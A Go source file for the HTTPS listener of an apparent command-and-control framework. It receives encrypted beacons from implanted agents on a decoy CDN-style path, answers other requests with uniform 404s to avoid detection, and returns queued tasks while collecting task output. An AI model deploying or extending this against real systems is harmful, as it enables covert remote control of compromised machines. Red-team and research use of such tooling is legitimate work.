package listener

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/aelder202/sable/internal/nonce"
	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
)

const (
	beaconPath              = "/cdn/static/update"
	maxBeaconBody           = 1 * 1024 * 1024
	timestampSlack          = 2 * time.Minute
	maxHTTPSRequestsPerHost = 200 // per httpsRateWindow; allows ~10/s for interactive-mode agents
	httpsRateWindow         = 10 * time.Second
)

type httpsBucket struct {
	count   int
	resetAt time.Time
}

type httpsRateLimiter struct {
	mu      sync.Mutex
	buckets map[string]*httpsBucket
}

func newHTTPSRateLimiter() *httpsRateLimiter {
	return &httpsRateLimiter{buckets: make(map[string]*httpsBucket)}
}

func (rl *httpsRateLimiter) allow(source string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	for key, b := range rl.buckets {
		if now.After(b.resetAt) {
			delete(rl.buckets, key)
		}
	}
	b, ok := rl.buckets[source]
	if !ok || now.After(b.resetAt) {
		rl.buckets[source] = &httpsBucket{count: 1, resetAt: now.Add(httpsRateWindow)}
		return true
	}
	if b.count >= maxHTTPSRequestsPerHost {
		return false
	}
	b.count++
	return true
}

// HTTPSHandler processes agent beacons over HTTPS.
type HTTPSHandler struct {
	store   *session.Store
	nonces  *nonce.Cache
	sources *httpsRateLimiter
}

// NewHTTPSHandler creates a handler that validates and processes beacons.
func NewHTTPSHandler(store *session.Store, nc *nonce.Cache) *HTTPSHandler {
	return &HTTPSHandler{store: store, nonces: nc, sources: newHTTPSRateLimiter()}
}

func (h *HTTPSHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Reject anything that is not POST to the beacon path.
	if r.Method != http.MethodPost || r.URL.Path != beaconPath {
		http.NotFound(w, r)
		return
	}

	if !h.sources.allow(remoteIPStr(r.RemoteAddr)) {
		http.NotFound(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, maxBeaconBody+1))
	if err != nil || len(body) == 0 || len(body) > maxBeaconBody {
		http.NotFound(w, r)
		return
	}

	// Peek at the agent ID from the envelope without fully decoding.
	var peek struct {
		AgentID string `json:"id"`
	}
	if err := json.Unmarshal(body, &peek); err != nil || peek.AgentID == "" {
		http.NotFound(w, r)
		return
	}

	// Look up the pre-shared secret. For unknown IDs, perform a dummy
	// DecodeBeacon with a zero-value secret to equalise timing and prevent
	// agent ID enumeration via response-time differences.
	secret, ok := h.store.Secret(peek.AgentID)
	if !ok {
		dummySecret := make([]byte, 32)
		protocol.DecodeBeacon(body, dummySecret) //nolint:errcheck
		http.NotFound(w, r)
		return
	}

	beacon, err := protocol.DecodeBeacon(body, secret)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	// Defense-in-depth: decrypted agent ID must match the envelope ID used for
	// secret lookup. protocol.DecodeBeacon already enforces this, but we re-check
	// here so that the listener never acts on a mismatched identity even if the
	// protocol layer is changed in the future.
	if beacon.AgentID != peek.AgentID {
		http.NotFound(w, r)
		return
	}

	// Reject beacons outside the ±2 minute window.
	age := time.Since(time.Unix(beacon.Timestamp, 0))
	if age < 0 {
		age = -age
	}
	if age > timestampSlack {
		http.NotFound(w, r)
		return
	}

	// Reject replayed nonces. SeenOrAdd is atomic: checks and records in one lock
	// acquisition to close the TOCTOU window between separate Seen and Add calls.
	if h.nonces.SeenOrAdd(beacon.Nonce) {
		http.NotFound(w, r)
		return
	}

	h.store.UpdateInfoWithTransport(beacon.AgentID, beacon.Hostname, beacon.OS, beacon.Arch, "https")
	outputComplete := true
	if beacon.TaskOutput != nil {
		outputComplete = h.store.RecordOutput(beacon.AgentID, beacon.TaskOutput)
	}

	var task *protocol.Task
	if outputComplete {
		task = h.store.DequeueTask(beacon.AgentID)
	}
	if task == nil {
		task = &protocol.Task{Type: "noop"}
	}

	resp, err := protocol.EncodeTask(task, secret)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	w.Write(resp) //nolint:errcheck
}

// remoteIPStr extracts the host from an "IP:port" string (r.RemoteAddr format).
func remoteIPStr(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr
	}
	return host
}
